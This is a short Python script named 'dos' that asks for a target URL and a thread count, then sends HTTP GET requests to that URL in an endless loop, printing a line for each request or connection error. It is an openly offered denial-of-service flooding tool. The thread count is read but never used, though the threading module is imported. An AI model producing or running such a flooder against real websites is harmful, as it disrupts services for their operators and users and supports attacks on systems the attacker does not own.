import requests
import threading

def dos(target):
	while True:
		try:
			res = requests.get(target)
			print('[+]  Request sent!')
		except requests.exceptions.ConnectionError:
			print('[+]  Connection erorr!')
url = input('[URL]-->  ')
threads = int(input('Threads -->  '))
dos(url)
